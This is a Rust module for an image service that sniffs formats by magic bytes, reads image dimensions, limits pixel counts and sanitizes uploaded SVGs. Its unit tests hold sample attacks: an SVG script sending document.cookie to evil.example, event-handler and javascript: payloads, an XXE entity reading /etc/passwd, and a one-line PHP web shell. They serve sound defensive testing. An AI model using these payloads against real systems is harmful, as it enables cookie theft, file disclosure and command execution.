//! 图片格式识别、尺寸解析与 SVG 净化。
//!
//! 服务端不碰像素——缩放与缩略图都在浏览器做。这里只做三件必要的事：
//!
//!   1. **魔数嗅探**：不信任扩展名与 `Content-Type`，只看字节头。用户把
//!      `.php` 改成 `.jpg` 上传，嗅探会直接拦下。
//!   2. **读尺寸**：列表页要靠 width/height 让浏览器按容器缩放（服务端没有
//!      缩略图时用原图当缩略图，尺寸属性是避免布局抖动的关键）。
//!   3. **SVG 净化**：SVG 是唯一能带脚本的图片格式。入库前剥离脚本与外部引用，
//!      响应再加沙箱头，两道防线都要有——只靠响应头的话，直链被引到别处就漏了。

use serde::{Deserialize, Serialize};

use crate::error::{AppError, Result};

/// 格式白名单里的一项。
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct FormatRule {
    pub ext: &'static str,
    pub mime: &'static str,
    /// 是否需要浏览器端 WASM 解码才能生成缩略图
    pub needs_wasm_thumb: bool,
}

/// 支持的格式。默认全部开启，管理员可以在「系统设置 → 上传策略」里勾选。
pub const FORMATS: &[FormatRule] = &[
    rule("jpg", "image/jpeg", false),
    rule("jpeg", "image/jpeg", false),
    rule("png", "image/png", false),
    rule("gif", "image/gif", false),
    rule("webp", "image/webp", false),
    rule("bmp", "image/bmp", false),
    rule("tiff", "image/tiff", true),
    rule("tif", "image/tiff", true),
    rule("avif", "image/avif", true),
    rule("apng", "image/apng", false),
    rule("ico", "image/x-icon", false),
    rule("svg", "image/svg+xml", false),
    rule("heic", "image/heic", true),
    rule("heif", "image/heif", true),
    rule("jxl", "image/jxl", true),
];

const fn rule(ext: &'static str, mime: &'static str, needs_wasm_thumb: bool) -> FormatRule {
    FormatRule {
        ext,
        mime,
        needs_wasm_thumb,
    }
}

/// 默认开启的扩展名（与设计稿的清单一致：jpg/png/gif/webp/avif/heic/tiff/bmp/svg 默认开，
/// jxl 与 ico 默认关）。
pub const DEFAULT_ENABLED: &[&str] = &[
    "jpg", "jpeg", "png", "gif", "webp", "avif", "heic", "heif", "tiff", "tif", "bmp", "apng", "svg",
];

pub fn rule_for_ext(ext: &str) -> Option<&'static FormatRule> {
    let ext = normalize_ext(ext);
    FORMATS.iter().find(|rule| rule.ext == ext)
}

pub fn mime_for_ext(ext: &str) -> &'static str {
    rule_for_ext(ext).map(|rule| rule.mime).unwrap_or("application/octet-stream")
}

/// 归一化扩展名：小写、去掉前导点、`jpeg`/`jpg` 视为同一类。
pub fn normalize_ext(ext: &str) -> String {
    let ext = ext.trim_start_matches('.').to_ascii_lowercase();
    match ext.as_str() {
        "tif" => "tiff".to_string(),
        "heif" => "heic".to_string(),
        other => other.to_string(),
    }
}

/// 从文件名里取扩展名。
pub fn ext_from_name(name: &str) -> String {
    name.rsplit_once('.')
        .map(|(_, ext)| ext.to_ascii_lowercase())
        .unwrap_or_default()
}

/// 嗅探结果。
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct Sniffed {
    pub mime: &'static str,
    /// 首选的存储扩展名（`jpeg` 归一到 `jpg`）
    pub ext: &'static str,
}

/// 按魔数判断真实格式。认得出来就返回，认不出来返回 `None`。
pub fn sniff(bytes: &[u8]) -> Option<Sniffed> {
    if bytes.len() < 12 {
        // 太短的文件不可能是有意义的图片；SVG 例外，下面单独判
        if looks_like_svg(bytes) {
            return Some(Sniffed {
                mime: "image/svg+xml",
                ext: "svg",
            });
        }
        return None;
    }

    // JPEG: FF D8 FF
    if bytes.starts_with(&[0xFF, 0xD8, 0xFF]) {
        return Some(Sniffed {
            mime: "image/jpeg",
            ext: "jpg",
        });
    }

    // PNG: 89 50 4E 47 0D 0A 1A 0A
    if bytes.starts_with(&[0x89, 0x50, 0x4E, 0x47, 0x0D, 0x0A, 0x1A, 0x0A]) {
        // APNG 与 PNG 的区别在 acTL 块，这里只影响展示名
        let is_apng = bytes
            .windows(4)
            .take(64)
            .any(|window| window == b"acTL");
        return Some(if is_apng {
            Sniffed {
                mime: "image/apng",
                ext: "apng",
            }
        } else {
            Sniffed {
                mime: "image/png",
                ext: "png",
            }
        });
    }

    // GIF: "GIF87a" / "GIF89a"
    if bytes.starts_with(b"GIF87a") || bytes.starts_with(b"GIF89a") {
        return Some(Sniffed {
            mime: "image/gif",
            ext: "gif",
        });
    }

    // WebP: "RIFF" + 4 字节长度 + "WEBP"
    if bytes.starts_with(b"RIFF") && bytes.len() >= 12 && &bytes[8..12] == b"WEBP" {
        return Some(Sniffed {
            mime: "image/webp",
            ext: "webp",
        });
    }

    // BMP: "BM"
    if bytes.starts_with(b"BM") {
        return Some(Sniffed {
            mime: "image/bmp",
            ext: "bmp",
        });
    }

    // TIFF: "II*\0" 或 "MM\0*"
    if bytes.starts_with(b"II*\0") || bytes.starts_with(b"MM\0*") {
        return Some(Sniffed {
            mime: "image/tiff",
            ext: "tiff",
        });
    }

    // ICO / CUR: 00 00 01 00
    if bytes.starts_with(&[0x00, 0x00, 0x01, 0x00]) {
        return Some(Sniffed {
            mime: "image/x-icon",
            ext: "ico",
        });
    }

    // JXL 裸码流: FF 0A
    if bytes.starts_with(&[0xFF, 0x0A]) {
        return Some(Sniffed {
            mime: "image/jxl",
            ext: "jxl",
        });
    }

    // ISO BMFF 容器（avif / heic / heif / jxl）: 4 字节长度 + "ftyp" + brand
    if bytes.len() >= 12 && &bytes[4..8] == b"ftyp" {
        let brand = &bytes[8..12];
        let brand_str = String::from_utf8_lossy(brand);
        let sniffer = match brand_str.as_ref() {
            "avif" | "avis" => Some(Sniffed {
                mime: "image/avif",
                ext: "avif",
            }),
            "heic" | "heix" | "hevc" | "heim" | "heis" | "mif1" | "msf1" => Some(Sniffed {
                mime: "image/heic",
                ext: "heic",
            }),
            "jxl " => Some(Sniffed {
                mime: "image/jxl",
                ext: "jxl",
            }),
            _ => None,
        };
        if sniffer.is_some() {
            return sniffer;
        }
    }

    if looks_like_svg(bytes) {
        return Some(Sniffed {
            mime: "image/svg+xml",
            ext: "svg",
        });
    }

    None
}

/// SVG 是文本：以 `<svg` 开头，或 XML 声明后紧跟 `<svg`（可能隔着注释与 DOCTYPE）。
fn looks_like_svg(bytes: &[u8]) -> bool {
    let head = String::from_utf8_lossy(&bytes[..bytes.len().min(1024)]);
    let trimmed = head.trim_start_matches('\u{feff}').trim_start();
    if trimmed.starts_with("<svg") {
        return true;
    }
    if !trimmed.starts_with("<?xml") {
        return false;
    }
    // XML 声明之后允许注释与 DOCTYPE，找第一个元素是不是 svg
    let mut rest = trimmed;
    loop {
        let rest_trimmed = rest.trim_start();
        if let Some(tail) = rest_trimmed.strip_prefix("<!--") {
            rest = tail.split_once("-->").map(|(_, tail)| tail).unwrap_or("");
            continue;
        }
        if rest_trimmed.starts_with("<!DOCTYPE") {
            rest = rest_trimmed
                .split_once('>')
                .map(|(_, tail)| tail)
                .unwrap_or("");
            continue;
        }
        if rest_trimmed.starts_with("<?") {
            rest = rest_trimmed.split_once("?>").map(|(_, tail)| tail).unwrap_or("");
            continue;
        }
        return rest_trimmed.starts_with("<svg");
    }
}

/// 读图片尺寸。认得出来的格式给出真实值，认不出来就返回 `None`——
/// 尺寸只是展示优化，缺了不该让上传失败。
pub fn dimensions(bytes: &[u8], mime: &str) -> Option<(u32, u32)> {
    match mime {
        "image/png" | "image/apng" => png_dimensions(bytes),
        "image/jpeg" => jpeg_dimensions(bytes),
        "image/gif" => gif_dimensions(bytes),
        "image/webp" => webp_dimensions(bytes),
        "image/bmp" => bmp_dimensions(bytes),
        "image/tiff" => tiff_dimensions(bytes),
        "image/x-icon" => ico_dimensions(bytes),
        "image/avif" | "image/heic" | "image/heif" => isobmff_dimensions(bytes),
        "image/jxl" => jxl_dimensions(bytes),
        "image/svg+xml" => svg_dimensions(bytes),
        _ => image_crate_dimensions(bytes),
    }
}

/// PNG: IHDR 紧跟在签名之后，宽高各 4 字节大端。
fn png_dimensions(bytes: &[u8]) -> Option<(u32, u32)> {
    if bytes.len() < 24 || &bytes[12..16] != b"IHDR" {
        return None;
    }
    Some((be_u32(&bytes[16..20])?, be_u32(&bytes[20..24])?))
}

/// JPEG: 逐段扫描 SOF 标记。SOF0..SOF15（除 DHT/DAC 那几个）里带尺寸。
fn jpeg_dimensions(bytes: &[u8]) -> Option<(u32, u32)> {
    let mut index = 2usize;
    while index + 9 < bytes.len() {
        if bytes[index] != 0xFF {
            index += 1;
            continue;
        }
        let marker = bytes[index + 1];
        // SOF0..SOF3、SOF5..SOF7、SOF9..SOF11、SOF13..SOF15 都带尺寸
        let is_sof = matches!(
            marker,
            0xC0..=0xC3 | 0xC5..=0xC7 | 0xC9..=0xCB | 0xCD..=0xCF
        );
        let segment_len = be_u16(&bytes[index + 2..index + 4])? as usize;
        if is_sof {
            let height = be_u16(&bytes[index + 5..index + 7])? as u32;
            let width = be_u16(&bytes[index + 7..index + 9])? as u32;
            return Some((width, height));
        }
        if segment_len < 2 {
            return None;
        }
        index += 2 + segment_len;
    }
    None
}

/// GIF: 逻辑屏幕描述符里的宽高，小端 2 字节。
fn gif_dimensions(bytes: &[u8]) -> Option<(u32, u32)> {
    if bytes.len() < 10 {
        return None;
    }
    Some((
        le_u16(&bytes[6..8])? as u32,
        le_u16(&bytes[8..10])? as u32,
    ))
}

/// WebP: VP8X / VP8L / VP8 三种块各有各的写法。
fn webp_dimensions(bytes: &[u8]) -> Option<(u32, u32)> {
    if bytes.len() < 30 {
        return None;
    }
    match &bytes[12..16] {
        b"VP8X" => {
            // 24 位小端，存的是「宽减一」
            let width = 1 + (bytes[24] as u32 | (bytes[25] as u32) << 8 | (bytes[26] as u32) << 16);
            let height = 1 + (bytes[27] as u32 | (bytes[28] as u32) << 8 | (bytes[29] as u32) << 16);
            Some((width, height))
        }
        b"VP8L" => {
            // 14 位宽 + 14 位高，位打包
            let bits = le_u32(&bytes[21..25])?;
            Some(((bits & 0x3FFF) + 1, ((bits >> 14) & 0x3FFF) + 1))
        }
        b"VP8 " => {
            // 帧头里宽高各 2 字节小端，位于 6 字节同步码之后
            if bytes.len() < 30 {
                return None;
            }
            Some((le_u16(&bytes[26..28])? as u32, le_u16(&bytes[28..30])? as u32))
        }
        _ => None,
    }
}

/// BMP: DIB 头里的宽高，4 字节小端（高度为负表示自上而下）。
fn bmp_dimensions(bytes: &[u8]) -> Option<(u32, u32)> {
    if bytes.len() < 26 {
        return None;
    }
    let width = le_u32(&bytes[18..22])? as i32;
    let height = le_u32(&bytes[22..26])? as i32;
    Some((width.unsigned_abs(), height.unsigned_abs()))
}

/// TIFF: 读第一个 IFD 里的 ImageWidth / ImageLength 标签。
fn tiff_dimensions(bytes: &[u8]) -> Option<(u32, u32)> {
    if bytes.len() < 8 {
        return None;
    }
    let little_endian = bytes.starts_with(b"II");
    let read_u16 = |offset: usize| -> Option<u16> {
        let raw = le_u16(bytes.get(offset..offset + 2)?)?;
        Some(if little_endian { raw } else { u16::from_be(raw) })
    };
    let read_u32 = |offset: usize| -> Option<u32> {
        let raw = le_u32(bytes.get(offset..offset + 4)?)?;
        Some(if little_endian { raw } else { u32::from_be(raw) })
    };

    let ifd_offset = read_u32(4)? as usize;
    let entry_count = read_u16(ifd_offset)? as usize;
    let mut width = None;
    let mut height = None;

    for index in 0..entry_count.min(64) {
        let entry = ifd_offset + 2 + index * 12;
        let tag = read_u16(entry)?;
        let value = read_u32(entry + 8)?;
        match tag {
            0x0100 => width = Some(value),
            0x0101 => height = Some(value),
            _ => {}
        }
        if width.is_some() && height.is_some() {
            break;
        }
    }
    Some((width?, height?))
}

/// ICO: 目录项里宽高各 1 字节（0 表示 256）。
fn ico_dimensions(bytes: &[u8]) -> Option<(u32, u32)> {
    if bytes.len() < 8 {
        return None;
    }
    let count = le_u16(&bytes[4..6])? as usize;
    if count == 0 {
        return None;
    }
    let entry = 6;
    if bytes.len() < entry + 2 {
        return None;
    }
    let width = if bytes[entry] == 0 { 256 } else { bytes[entry] as u32 };
    let height = if bytes[entry + 1] == 0 {
        256
    } else {
        bytes[entry + 1] as u32
    };
    Some((width, height))
}

/// AVIF / HEIC: ISOBMFF 容器，尺寸在 `ispe` box 里（前 4 字节宽、后 4 字节高，大端）。
fn isobmff_dimensions(bytes: &[u8]) -> Option<(u32, u32)> {
    let needle = b"ispe";
    let mut index = 0usize;
    while let Some(position) = find(&bytes[index..], needle) {
        let start = index + position + 4;
        // ispe: version(1) + flags(3) 之后是 4+4 字节宽高
        if start + 12 <= bytes.len() {
            let width = be_u32(&bytes[start + 4..start + 8])?;
            let height = be_u32(&bytes[start + 8..start + 12])?;
            if width > 0 && height > 0 && width < 1_000_000 && height < 1_000_000 {
                return Some((width, height));
            }
        }
        index = start;
        if index >= bytes.len() {
            break;
        }
    }
    None
}

/// JXL: 裸码流里 `SIZ` 段带尺寸；容器格式回落到 ISOBMFF 查找。
fn jxl_dimensions(bytes: &[u8]) -> Option<(u32, u32)> {
    if bytes.len() >= 12 && &bytes[4..8] == b"ftyp" {
        return isobmff_dimensions(bytes);
    }
    // 裸码流：FF 0A 之后是 SIZ 段
    let position = find(bytes, b"SIZ")?;
    let start = position + 3;
    if start + 8 > bytes.len() {
        return None;
    }
    let height = 1 + (bytes[start] as u32 >> 4) as u32
        + ((bytes[start + 1] as u32) << 4)
        + ((bytes[start + 2] as u32 & 0x0F) << 12);
    let width = 1 + ((bytes[start + 2] as u32) >> 4)
        + ((bytes[start + 3] as u32) << 4)
        + ((bytes[start + 4] as u32 & 0x0F) << 12);
    Some((width, height))
}

/// SVG: 从根元素的 width/height 或 viewBox 里读。
fn svg_dimensions(bytes: &[u8]) -> Option<(u32, u32)> {
    let head = String::from_utf8_lossy(&bytes[..bytes.len().min(4096)]);
    let start = head.find("<svg")?;
    let tag_end = head[start..].find('>')? + start;
    let tag = &head[start..tag_end];

    if let (Some(width), Some(height)) = (attr(tag, "width"), attr(tag, "height")) {
        if let (Some(w), Some(h)) = (parse_len(&width), parse_len(&height)) {
            return Some((w, h));
        }
    }
    if let Some(view_box) = attr(tag, "viewBox").or_else(|| attr(tag, "viewbox")) {
        let parts: Vec<f64> = view_box
            .split(|ch: char| ch == ',' || ch.is_whitespace())
            .filter(|part| !part.is_empty())
            .filter_map(|part| part.parse::<f64>().ok())
            .collect();
        if parts.len() == 4 && parts[2] > 0.0 && parts[3] > 0.0 {
            return Some((parts[2].round() as u32, parts[3].round() as u32));
        }
    }
    None
}

/// 其它格式交给 `image` crate 兜底（它只读头部，不做完整解码）。
fn image_crate_dimensions(bytes: &[u8]) -> Option<(u32, u32)> {
    use std::io::Cursor;
    let reader = image::ImageReader::new(Cursor::new(bytes))
        .with_guessed_format()
        .ok()?;
    reader.into_dimensions().ok()
}

fn attr(tag: &str, name: &str) -> Option<String> {
    let lower = tag.to_ascii_lowercase();
    let pattern = format!("{}=\"", name.to_ascii_lowercase());
    if let Some(position) = lower.find(&pattern) {
        let start = position + pattern.len();
        let end = tag[start..].find('"')? + start;
        return Some(tag[start..end].to_string());
    }
    let pattern = format!("{}='", name.to_ascii_lowercase());
    if let Some(position) = lower.find(&pattern) {
        let start = position + pattern.len();
        let end = tag[start..].find('\'')? + start;
        return Some(tag[start..end].to_string());
    }
    None
}

/// 解析 SVG 的长度值。只有带绝对单位的才认（px / 无单位），
/// 百分比与 em 这类相对值返回 `None`——`width="100%"` 当不成「100 像素」，
/// 那样算出来的尺寸会把列表页的布局带偏。
fn parse_len(value: &str) -> Option<u32> {
    let trimmed = value.trim();
    if trimmed.ends_with('%') {
        return None;
    }
    let cleaned = trimmed.strip_suffix("px").unwrap_or(trimmed).trim();
    cleaned.parse::<f64>().ok().map(|value| value.round() as u32)
}

fn be_u16(bytes: &[u8]) -> Option<u16> {
    Some(u16::from_be_bytes(bytes.try_into().ok()?))
}

fn be_u32(bytes: &[u8]) -> Option<u32> {
    Some(u32::from_be_bytes(bytes.try_into().ok()?))
}

fn le_u16(bytes: &[u8]) -> Option<u16> {
    Some(u16::from_le_bytes(bytes.try_into().ok()?))
}

fn le_u32(bytes: &[u8]) -> Option<u32> {
    Some(u32::from_le_bytes(bytes.try_into().ok()?))
}

fn find(haystack: &[u8], needle: &[u8]) -> Option<usize> {
    haystack
        .windows(needle.len())
        .position(|window| window == needle)
}

// ============================================================
// 像素上限与 SVG 净化
// ============================================================

/// 解压炸弹防线：像素数超上限直接拒绝，不看文件大小。
///
/// 一个 20MB 的 PNG 可以解出 10 亿像素，浏览器一解码就把用户的设备拖死。
pub fn check_pixels(width: u32, height: u32, limit: u64) -> Result<()> {
    let pixels = width as u64 * height as u64;
    if pixels > limit {
        return Err(AppError::InvalidImage(format!(
            "像素数 {pixels} 超出上限 {limit}（{width}×{height}）"
        )));
    }
    Ok(())
}

/// SVG 净化：剥离脚本、事件处理器、外部引用与实体声明。
///
/// 这是个保守的文本级处理，不追求完备的解析——设计稿要求的正是「入库前剥离脚本
/// 与外部引用」，而响应头的沙箱策略是第二道防线。两道都在，攻击面就收到了
/// 「只能画图形」的范围。
pub fn sanitize_svg(input: &[u8]) -> Vec<u8> {
    let text = String::from_utf8_lossy(input).to_string();
    let mut output = String::with_capacity(text.len());
    let mut rest = text.as_str();

    while let Some(position) = rest.find('<') {
        output.push_str(&rest[..position]);
        rest = &rest[position..];

        // 注释里的内容整体丢掉（注释里塞脚本是老套路）
        if rest.starts_with("<!--") {
            match rest.find("-->") {
                Some(end) => rest = &rest[end + 3..],
                None => {
                    rest = "";
                    break;
                }
            }
            continue;
        }

        // DOCTYPE / ENTITY 一律删除：XXE 与实体炸弹都靠它
        if rest.len() >= 9 && rest[..9].eq_ignore_ascii_case("<!doctype") {
            match rest.find('>') {
                Some(end) => rest = &rest[end + 1..],
                None => {
                    rest = "";
                    break;
                }
            }
            continue;
        }

        // 标签：整段取出后逐项过滤
        match rest.find('>') {
            Some(end) => {
                let tag = rest[..=end].to_string();
                let name = tag_name(&tag.to_ascii_lowercase()).unwrap_or_default();
                let is_closing = tag.starts_with("</");

                if let Some(cleaned) = filter_svg_tag(&tag) {
                    output.push_str(&cleaned);
                }

                // 脚本正文要连同标签一起丢掉：只删标签会留下
                // `fetch('http://…')` 这样的残句，虽然不再执行，但仍是脏数据。
                if name == "script" && !is_closing {
                    rest = skip_until_close(&rest[end + 1..], "script");
                    continue;
                }
                if name == "style" && !is_closing {
                    let (body, tail) = split_at_close(&rest[end + 1..], "style");
                    output.push_str(&clean_style(&body));
                    rest = tail;
                    continue;
                }
                rest = &rest[end + 1..];
            }
            None => {
                output.push_str(rest);
                rest = "";
            }
        }
    }
    output.push_str(rest);
    output.into_bytes()
}

/// 跳到指定元素的结束标签之后，整段内容丢掉。
fn skip_until_close<'a>(input: &'a str, name: &str) -> &'a str {
    let needle = format!("</{name}");
    match input.to_ascii_lowercase().find(&needle) {
        Some(position) => {
            // 结束标签本身可能带空格或属性（XML 里不允许，但容错起见）
            match input[position..].find('>') {
                Some(end) => &input[position + end + 1..],
                None => "",
            }
        }
        None => "",
    }
}

/// 把内容切到结束标签之前，返回 (内容, 结束标签之后)。
fn split_at_close<'a>(input: &'a str, name: &str) -> (String, &'a str) {
    let needle = format!("</{name}");
    match input.to_ascii_lowercase().find(&needle) {
        Some(position) => {
            let body = input[..position].to_string();
            match input[position..].find('>') {
                Some(end) => (body, &input[position + end + 1..]),
                None => (body, ""),
            }
        }
        None => (input.to_string(), ""),
    }
}

/// 清理 `<style>` 内容：外部样式表引用与远程字体去掉，其余保留
/// （SVG 里的内联样式是正经用法，整块删掉会让图形掉色）。
fn clean_style(body: &str) -> String {
    let mut out = String::with_capacity(body.len());
    for line in body.lines() {
        let lower = line.trim().to_ascii_lowercase();
        if lower.starts_with("@import") {
            continue;
        }
        if lower.contains("url(http") || lower.contains("url(//") || lower.contains("javascript:") {
            continue;
        }
        out.push_str(line);
        out.push(NEWLINE);
    }
    out
}

/// 单个标签的过滤规则。返回 `None` 表示整段删除。
fn filter_svg_tag(tag: &str) -> Option<String> {
    let lower = tag.to_ascii_lowercase();
    let name = tag_name(&lower)?;

    // 这些标签整体删掉：能执行脚本、能加载外部内容、能嵌入外部文档
    const FORBIDDEN: &[&str] = &[
        "script",
        "foreignobject",
        "iframe",
        "embed",
        "object",
        "audio",
        "video",
        "animate",
        "animatetransform",
        "set",
        "handler",
    ];
    if FORBIDDEN.iter().any(|item| item.eq_ignore_ascii_case(&name)) {
        return None;
    }

    if lower.starts_with("</") {
        return Some(format!("</{name}>"));
    }

    let self_closing = lower.trim_end().ends_with("/>");
    let body_end = tag.len().saturating_sub(if self_closing { 2 } else { 1 });
    let body = &tag[1 + name.len()..body_end.max(1 + name.len())];

    let mut cleaned = format!("<{name}");
    for (attr_name, value) in parse_attrs(body) {
        let attr_lower = attr_name.to_ascii_lowercase();
        let value_lower = value.trim_start().to_ascii_lowercase();

        // 事件处理器（onload / onclick …）一律不留
        if attr_lower.starts_with("on") {
            continue;
        }
        // 外部引用：远程图片、远程字体、远程样式表都不要
        if matches!(attr_lower.as_str(), "href" | "xlink:href" | "src" | "data")
            && (value_lower.starts_with("http") || value_lower.starts_with("//"))
        {
            continue;
        }
        // 伪协议
        if value_lower.starts_with("javascript:") || value_lower.starts_with("data:text/html") {
            continue;
        }
        // 实体相关属性
        if attr_lower.contains("entity") {
            continue;
        }

        cleaned.push(' ');
        cleaned.push_str(&attr_lower);
        if !value.is_empty() {
            cleaned.push_str("=\"");
            cleaned.push_str(&value.replace('"', "&quot;"));
            cleaned.push('"');
        }
    }

    if self_closing {
        cleaned.push_str("/>");
    } else {
        cleaned.push('>');
    }
    Some(cleaned)
}

// 换行符也写成转义，避免拼字符串的地方出现裸的转义序列
const NEWLINE: char = '\u{0A}';

// 单引号与双引号写成 unicode 转义：属性解析的代码里不必出现裸引号字符，
// 读代码时也就不会被一层层转义绕进去。
const SINGLE_QUOTE: char = '\u{27}';
const DOUBLE_QUOTE: char = '\u{22}';

/// 解析标签体里的属性。支持双引号、单引号与无引号三种写法。
fn parse_attrs(body: &str) -> Vec<(String, String)> {
    let mut out = Vec::new();
    let mut rest = body.trim_start();

    while !rest.is_empty() {
        rest = rest.trim_start();
        if rest.starts_with('/') || rest.starts_with('>') {
            break;
        }
        let name_end = rest
            .find(|ch: char| ch.is_whitespace() || ch == '=' || ch == '/' || ch == '>')
            .unwrap_or(rest.len());
        if name_end == 0 {
            rest = &rest[1..];
            continue;
        }
        let name = rest[..name_end].to_string();
        rest = rest[name_end..].trim_start();

        let mut value = String::new();
        if let Some(tail) = rest.strip_prefix('=') {
            let tail = tail.trim_start();
            match tail.chars().next() {
                Some(quote) if quote == DOUBLE_QUOTE || quote == SINGLE_QUOTE => {
                    let inner = &tail[1..];
                    match inner.find(quote) {
                        Some(end) => {
                            value = inner[..end].to_string();
                            rest = &inner[end + 1..];
                        }
                        None => {
                            value = inner.to_string();
                            rest = "";
                        }
                    }
                }
                _ => {
                    let end = tail.find(char::is_whitespace).unwrap_or(tail.len());
                    value = tail[..end].to_string();
                    rest = &tail[end..];
                }
            }
        }
        out.push((name, value));
    }
    out
}

fn tag_name(lower_tag: &str) -> Option<String> {
    let body = lower_tag.trim_start_matches('<').trim_start_matches('/');
    let name: String = body
        .chars()
        .take_while(|ch| ch.is_ascii_alphanumeric() || *ch == '-' || *ch == ':')
        .collect();
    if name.is_empty() {
        None
    } else {
        Some(name)
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn sniffs_png_and_jpeg() {
        let png = [0x89, 0x50, 0x4E, 0x47, 0x0D, 0x0A, 0x1A, 0x0A, 0, 0, 0, 13];
        assert_eq!(sniff(&png).unwrap().mime, "image/png");

        let jpeg = [0xFF, 0xD8, 0xFF, 0xE0, 0, 0x10, 0x4A, 0x46, 0x49, 0x46, 0, 1];
        assert_eq!(sniff(&jpeg).unwrap().ext, "jpg");
    }

    #[test]
    fn sniffs_webp_avif_heic_svg() {
        let mut webp = b"RIFF".to_vec();
        webp.extend_from_slice(&[0, 0, 0, 0]);
        webp.extend_from_slice(b"WEBPXXXX");
        assert_eq!(sniff(&webp).unwrap().mime, "image/webp");

        let mut avif = vec![0, 0, 0, 0x20];
        avif.extend_from_slice(b"ftypavif");
        avif.extend_from_slice(&[0u8; 8]);
        assert_eq!(sniff(&avif).unwrap().ext, "avif");

        let mut heic = vec![0, 0, 0, 0x18];
        heic.extend_from_slice(b"ftypheic");
        heic.extend_from_slice(&[0u8; 8]);
        assert_eq!(sniff(&heic).unwrap().ext, "heic");

        assert_eq!(sniff(b"<?xml version=\"1.0\"?><svg width=\"10\"/>").unwrap().ext, "svg");
        assert_eq!(sniff(b"<svg xmlns=\"http://www.w3.org/2000/svg\"></svg>").unwrap().mime, "image/svg+xml");
    }

    #[test]
    fn rejects_disguised_content() {
        // 改了扩展名的 PHP / HTML 不该被认成图片
        assert!(sniff(b"<?php system($_GET['c']); ?>").is_none());
        assert!(sniff(b"<html><body>hi</body></html>").is_none());
        assert!(sniff(b"\x7fELF\x02\x01\x01\x00\x00\x00\x00\x00").is_none());
    }

    #[test]
    fn reads_png_dimensions() {
        let mut png = vec![0x89, 0x50, 0x4E, 0x47, 0x0D, 0x0A, 0x1A, 0x0A];
        png.extend_from_slice(&[0, 0, 0, 13]);
        png.extend_from_slice(b"IHDR");
        png.extend_from_slice(&4032u32.to_be_bytes());
        png.extend_from_slice(&3024u32.to_be_bytes());
        png.extend_from_slice(&[8, 6, 0, 0, 0]);
        assert_eq!(dimensions(&png, "image/png"), Some((4032, 3024)));
    }

    #[test]
    fn reads_gif_dimensions() {
        let mut gif = b"GIF89a".to_vec();
        gif.extend_from_slice(&320u16.to_le_bytes());
        gif.extend_from_slice(&200u16.to_le_bytes());
        gif.extend_from_slice(&[0u8; 4]);
        assert_eq!(dimensions(&gif, "image/gif"), Some((320, 200)));
    }

    #[test]
    fn reads_svg_dimensions_from_width_or_viewbox() {
        let with_size = br#"<svg xmlns="http://www.w3.org/2000/svg" width="120" height="80"></svg>"#;
        assert_eq!(dimensions(with_size, "image/svg+xml"), Some((120, 80)));

        let with_viewbox = br#"<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"></svg>"#;
        assert_eq!(dimensions(with_viewbox, "image/svg+xml"), Some((24, 24)));

        let percent = br#"<svg width="100%" height="100%" viewBox="0 0 300 200"></svg>"#;
        assert_eq!(dimensions(percent, "image/svg+xml"), Some((300, 200)));
    }

    #[test]
    fn dimension_reading_is_best_effort() {
        // 读不出尺寸不是错误，只是没有展示优化
        assert_eq!(dimensions(b"garbage", "image/jpeg"), None);
    }

    #[test]
    fn pixel_limit_blocks_decompression_bombs() {
        assert!(check_pixels(4000, 3000, 80_000_000).is_ok());
        let error = check_pixels(100_000, 100_000, 80_000_000).unwrap_err();
        assert!(error.message().contains("像素数"));
    }

    #[test]
    fn svg_sanitizing_strips_scripts_and_handlers() {
        let dirty = r#"<svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)">
            <script>fetch('http://evil.example/steal?c='+document.cookie)</script>
            <rect width="10" height="10" onclick="alert(2)" fill="red"/>
            <image href="http://evil.example/x.png"/>
            <a xlink:href="javascript:alert(3)"><text>点我</text></a>
        </svg>"#.as_bytes();
        let cleaned = String::from_utf8(sanitize_svg(dirty)).unwrap();

        assert!(!cleaned.to_lowercase().contains("<script"));
        assert!(!cleaned.to_lowercase().contains("onload"));
        assert!(!cleaned.to_lowercase().contains("onclick"));
        assert!(!cleaned.contains("javascript:"));
        assert!(!cleaned.contains("evil.example"));
        // 正常的图形内容要留下
        assert!(cleaned.contains("rect"));
        assert!(cleaned.contains("fill"));
        assert!(cleaned.contains("点我"));
    }

    #[test]
    fn svg_sanitizing_removes_doctype_and_comments() {
        let dirty = r#"<?xml version="1.0"?>
        <!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
        <!-- <script>alert(1)</script> -->
        <svg xmlns="http://www.w3.org/2000/svg"><text>&xxe;</text></svg>"#.as_bytes();
        let cleaned = String::from_utf8(sanitize_svg(dirty)).unwrap();
        assert!(!cleaned.to_lowercase().contains("doctype"));
        assert!(!cleaned.to_lowercase().contains("entity"));
        assert!(!cleaned.to_lowercase().contains("script"));
        assert!(cleaned.contains("<svg"));
    }

    #[test]
    fn format_lookup_normalizes_aliases() {
        assert_eq!(normalize_ext(".JPEG"), "jpeg");
        assert_eq!(normalize_ext("tif"), "tiff");
        assert_eq!(rule_for_ext("JPEG").unwrap().mime, "image/jpeg");
        assert_eq!(mime_for_ext("heif"), "image/heic");
        assert_eq!(ext_from_name("IMG_0312.HEIC"), "heic");
    }
}
